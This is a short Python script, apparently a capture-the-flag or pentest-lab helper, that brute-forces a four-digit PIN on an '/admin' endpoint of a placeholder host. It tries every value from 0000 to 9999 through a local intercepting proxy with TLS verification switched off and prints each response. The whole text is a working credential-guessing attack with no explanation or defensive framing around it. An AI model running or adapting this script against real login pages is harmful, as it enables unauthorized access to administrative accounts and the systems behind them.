import re
import urllib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {
    'https': 'http://127.0.0.1:8080',
    'http': 'http://127.0.0.1:8080'
}


for i in range(0, 10000): 
    if (i < 10): 
        pin = "000" + str(i)
    elif (i < 100): 
        pin = "00" + str(i) 
    elif (i < 1000): 
        pin = "0" + str(i)  
    else: pin = str(i) 

    # Encode the pin 
    params = {
        "pin": pin
    }
    
    r = requests.post("https://files.{q}.com/admin", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
    "Content-Type": "application/x-www-form-urlencoded"
    })

    print(f'Results for pin = {pin}:\n{r.content}\n', flush=True)